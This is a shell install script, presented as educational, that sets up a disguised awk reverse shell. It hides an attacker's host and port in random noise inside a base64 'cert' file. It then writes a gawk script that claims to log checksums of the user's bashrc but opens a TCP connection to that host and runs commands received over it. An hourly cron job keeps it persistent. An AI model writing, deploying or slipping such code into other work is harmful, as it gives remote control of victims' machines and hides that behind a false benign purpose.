#!/bin/sh
# install.sh
#
# This walks through how to install the awk reverse shell.
# Please use with caution.
#
# Disclaimer:
# This project is for educational and research purposes only.
# The author is not responsible for individuals who misuse
# these materials for illegal purposes.

CHECKRC_DIR="$HOME/.checkrc"

# mkcert will create a "cert" that obfuscates the location
# of the remote server
mkcert() {
  FINAL_CERT="$CHECKRC_DIR/.key"
  BYTES_FILE="/tmp/randombytes.raw"

  # clear temp file
  printf "" >$BYTES_FILE

  # get the desired host-port destination
  HOST="${1:-localhost}"
  PORT="${2:-8888}"

  # craft the awk-style network URI
  DEST=$(printf '/inet/tcp/0/%s/%s' "$HOST" "$PORT")

  # print the data to the bytes file with a bunch of random noise
  echo "$DEST" | while read -n 3 CHARS; do
    </dev/urandom tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' | head -c 128 >>$BYTES_FILE
    printf ' %s ' $CHARS >>$BYTES_FILE
  done

  base64 "$BYTES_FILE" >"$FINAL_CERT"
}

# install checkrc.awk
install_checkrc() {
  BIN="$CHECKRC_DIR/checkrc.awk"
  cat >"$BIN" <<EOF
#!/usr/bin/gawk -f
# checkrc.awk
#
# This is a simple script to periodically write checksums of your bashrc to a log
# file to determine if and when changes were made to it.

BEGIN {
  # load key into memory two bytes at a time
  ("base64 --decode $CHECKRC_DIR/.key" | getline)
  for (i=2;i<=NF;i+=2) key=key\$i

  # generate hmac of bash profile and save to logfile
  print "starting with key " |& key
  system(sprintf("openssl dgst -sha1 -hmac %s ~/.bashrc >>$CHECKRC_DIR/shasums.txt", key))

  # flush buffers and clean up file descriptors
  close(key |&getline fd)
  print "closed " |& fd
}
EOF
  chmod +x "$BIN"
}

# set crontab to run every hour
set_crontab() {
  (crontab -l 2>/dev/null; echo "0 * * * * $CHECKRC_DIR/checkrc.awk 2>/dev/null") | crontab -
}

main() {
  mkdir -p "$CHECKRC_DIR"
  printf "Enter host (localhost): "
  read HOST
  printf "Enter port (8888): "
  read PORT
  mkcert "$HOST" "$PORT"
  install_checkrc
  set_crontab
}

main
